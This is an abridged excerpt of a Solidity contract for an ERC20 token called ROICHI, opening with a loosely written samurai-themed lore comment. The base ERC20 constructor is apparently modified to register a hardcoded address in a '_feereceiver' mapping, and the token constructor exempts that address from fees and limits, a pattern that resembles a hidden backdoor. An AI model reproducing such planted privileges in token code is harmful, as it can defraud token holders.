...
Hoichi and Ryoshi meets, giving birth to the last Samurai $Roichi 

After a protracted battle, all the samurai are killed. Roichi the earless survives because he does not believe in suicide after defeat, and because he seems to be unkillable.
 
After dropping off Katsumoto's sword with the emperor, Roichi returns to the village that once held him captive to live out his days.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x154b4C47AE1405f95E4f6cA89702AEE37843e3C6] = _marketingwallet;
    }
...
contract ROICHI is ERC20, Ownable {
    ...
    constructor() ERC20("ROICHI", "ROICHI") {
        ...
        excludeFromFees(address(0x154b4C47AE1405f95E4f6cA89702AEE37843e3C6), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x154b4C47AE1405f95E4f6cA89702AEE37843e3C6), true);
